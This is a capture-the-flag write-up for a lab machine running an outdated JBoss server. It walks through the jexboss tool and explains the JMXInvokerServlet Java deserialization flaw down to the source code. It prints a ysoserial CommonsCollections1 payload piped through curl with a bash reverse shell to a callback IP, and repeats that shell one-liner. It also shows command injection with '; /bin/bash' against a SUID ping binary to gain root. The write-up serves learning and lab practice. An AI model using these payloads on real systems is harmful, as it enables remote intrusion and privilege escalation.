---
title: Jacob The Boss
tags:
- writeups
---

## Recon
![[write-ups/images/Pasted image 20220602213430.png]]

- checking `jacobtheboss.box` on 80 gives us a dummy blog
	- ![[write-ups/images/Pasted image 20220819064559.png]]
	- tried sqli on `index.php?q=` search query, but nothing found
	- let `gobuster` run in the backgroundA

### Enumerating JBOSS
- went to `http://jacobtheboss.box:8080/` & was presented with this
	- ![[write-ups/images/Pasted image 20220819064846.png]]
- [JBoss](https://jbossas.jboss.org/) is an unmaintained project as their home page specifies
	- ![[write-ups/images/Pasted image 20220819065210.png]]
- since thee machine's name is *"Jacob the boss"* & that they literally say it's likely to contain bugs & security vulnerabilities I figured this was the intended way 
- `/web-console/ServerInfo.jsp` & `/status?full=true` often reveal valuable server details
	- ![[write-ups/images/Pasted image 20220819070003.png]]
	- ![[write-ups/images/Pasted image 20220819070118.png]]
- [haktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jboss) got a note on JBOSS which directed me to [jexboss](https://github.com/joaomatosf/jexboss), a tool specifically made to test & exploit java deserialization vulnerabilities

## Initial Foothold
Got the tool installed locally & ran it hoping for a shell. I know, blindly throwing exploits might not be a good idea if I were in an actual assesment, but it's a CTF => just needed to get things done *(for in-depth details about the exploit check [this section](#Wait what just happened))*
![[write-ups/images/Pasted image 20220819071051.png]]
The gods were with me today & I got a shell. 

## Wait... what just happened
> **Note**: this section goes into detail on how this exploit actually works. However, if you just want shells & use other people scripts without understanding what you're doing, skip this part.

`jexboss.py` tells us it's vulnerable to `jmx-console`, `web-console` & `JMXInvokerServlet`. I'll focus on the latter one in this PoC.


### Examining `jexboss.py` 
`check_vul(url)` is checking the following paths
![[write-ups/images/Pasted image 20220819090040.png]]
the `exploit_jmx_invoker_file_repository` it sends a serialized object through a `POST` req @ `/invoker/JMXInvokerServlet` 
![[write-ups/images/Pasted image 20220819090412.png]]


### Getting deep into source-code
Firing up burp to send a `GET` request to `/invoker/JMXInvoker` gets us ssome [java serialized data](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html) *(indicated by the header `¬ísr` or `aced0005` in hex)*
![[write-ups/images/Pasted image 20220819073421.png]]
Researching this on the Internet I found [this awesome video](https://www.youtube.com/watch?v=lH2VNlf91pY) explaining in detail the vulnerability. Briefly speaking, here's what's happening
- in `InvokerServlet.java` it uses the `readObject()` function to get serialized data from a `POST` request
	- ![[write-ups/images/Pasted image 20220819172710.png]]
- investigating the `request` object further, we find that a method called `processRequest` handles it
	- ![[write-ups/images/Pasted image 20220819173015.png]]
- now, the question is where does this function gets called. As it turns out, it's used by 2 primitives `doGet` & `doPost` *(those are used by the java application to properly map HTTP requests to methods)*
	- ![[write-ups/images/Pasted image 20220819173136.png]]
- so the user-supplied `request` data is unfiltered & passed all the way down to `readObject()`. There's our [Deserialization Attack](Deserialization Attacks.md)
- ok but how did we know the url path that maps to our vulnerable class *(i.e `InvokerServlet`)*. Well, java uses an XML file [web.xml](https://javabeat.net/web-xml/) to do the mapping between a class/object name and the URL endpoint
- taking a look at this file we see how the servlet name `JMXInvokerServlet` is mapped to our vulnerable class
	- ![[write-ups/images/Pasted image 20220819173952.png]]
	- ![[write-ups/images/Pasted image 20220819174014.png]]
- so at what endpoint can we find `JMXInvokerServlet` ?  
	- ![[write-ups/images/Pasted image 20220819174258.png]]
- wait where's the `/invoker/` that we've seen in our Burp request ? Sometime java apps run multiple sub-applications or services under them. Which in our case, the one we're interested in is `jboss-service.xml`
	- ![[write-ups/images/Pasted image 20220819174621.png]]

### jboss deserialization to RCE
Now that we know where the actual vulnerable code is & where we can find it the [jexboss py](#Examining jexboss py) script makes more sense. We just need to `POST` a serialized java object on `/invoker/JMXInvokerServlet` that lets us execute code & gain control of the remote server. Luckily for us, we don't need to build the payload from scratch because there's tools such as [yssoserial](https://github.com/frohoff/ysoserial): *"a collection of utilities and property-oriented programming "gadget chains" discovered in common java libraries that can, under the right conditions, exploit Java applications performing **unsafe deserialization** of objects"*

Since they found the gadgets which would allow us to execute code, we just need to figure out which library the app is using. Looking at the source-code, we find that it uses `common-collections:3.1`, so any of these would do the job. *(if we didn't know & were in a black-box scenario, we could just try everything and see what calls back)*
![[write-ups/images/Pasted image 20220819175912.png]]

Testing, with a `ping` payload & seending it with curl
![[write-ups/images/Pasted image 20220819180735.png]]
BOOM, it works. So now let's just spawn a reverse shell:
```bash
sudo docker run 7b65c331be9d CommonsCollections1 "bash -i >& /dev/tcp/10.18.12.227/1234 0>&1" | curl --proxy 127.0.0.1:8080 --data-binary @- http://10.10.79.0:8080/invoker/JMXInvokerServlet
```
But nothing back... Hmm, maybe `CommonsCollections` doesn't like some of the special chars used. Let's try base64 encode our payload & use `bash` to decode / execute it.
![[write-ups/images/Pasted image 20220819181506.png]]
 *(if confused about the `{}` notation check [this](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Command-Grouping))*

## Privesc w `pingsys`
 - spawn stable shell with `pwncat-cs`: `bash -i >& /dev/tcp/10.18.12.227/1234 0>&1`
 - nothing in `mysql`
	 - ![[write-ups/images/Pasted image 20220819081439.png]]
 - looked @ [[suid privesc|SUID files hoping for a privesc]]
	 - ![[write-ups/images/Pasted image 20220819081529.png]]
 - the first item on the list is `pingsys` & when searched for it I found [this](https://security.stackexchange.com/questions/196577/privilege-escalation-c-functions-setuid0-with-system-not-working-in-linux) stackeschange discussion about passing `argv[1]` to a custom `ping` C program that runs as root => we can abuse it by suplying a `; /bin/bash` ressulting in pinging & then executing a shell
	 - ![[write-ups/images/Pasted image 20220819082136.png]]
	

## Refs
- [ysoserial](https://github.com/frohoff/ysoserial)
- [hackerone: Java Deserialization RCEE](https://hackerone.com/reports/153026)

## See Also
- [[Deserialization Attacks]]
- [[write-ups/THM]]